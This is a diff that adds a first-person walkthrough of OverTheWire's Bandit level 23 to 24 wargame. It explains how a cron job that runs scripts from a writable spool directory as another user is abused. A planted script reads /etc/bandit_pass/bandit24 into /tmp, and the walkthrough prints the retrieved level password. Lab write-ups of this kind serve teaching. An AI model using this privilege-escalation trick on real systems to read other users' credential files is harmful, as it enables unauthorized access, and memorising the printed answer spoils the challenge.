@@ -1,0 +1,51 @@
+Bandit Level 23 → Level 24
+After logging into Bandit Level 23, I checked the cron jobs to understand how the next 
+password might be generated. I navigated to the cron directory:
+cd /etc/cron.d
+ls
+
+From the list, cronjob_bandit24 looked relevant, so I opened it:
+cat cronjob_bandit24
+
+This showed that /usr/bin/cronjob_bandit24.sh runs every minute and at reboot as user
+bandit24.
+Next, I examined the script itself:
+cat /usr/bin/cronjob_bandit24.sh
+
+From the script, I observed the following behavior:
+The script changes directory to /var/spool/bandit24/foo
+It executes all files in that directory that are owned by bandit23
+Each script is executed as bandit24
+
+After execution, the script deletes the files
+This meant I could place my own script (owned by bandit23) into /var/spool/bandit24/foo, and it would be executed with bandit24 privileges.
+I created a working directory in /tmp and wrote a script to copy the bandit24 password into a readable file:
+mkdir /tmp/deam
+cd /tmp/deam
+nano pass.sh
+
+
+Inside pass.sh, I added commands to read the password file and save it to /tmp:
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt
+
+I made the script executable:
+chmod 755 pass.sh
+
+Then I copied the script into the cron-executed directory:
+cp pass.sh /var/spool/bandit24/foo/pass.sh
+
+After waiting for the cron job to run (up to one minute), the script executed as 
+bandit24 and created the password file. I then read it:
+cat /tmp/bandit24_pass.txt
+
+This revealed the password for the next level:
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+
+Finally, I logged into Bandit Level 24 using SSH:
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+
+I entered the retrieved password, and the login was successful.
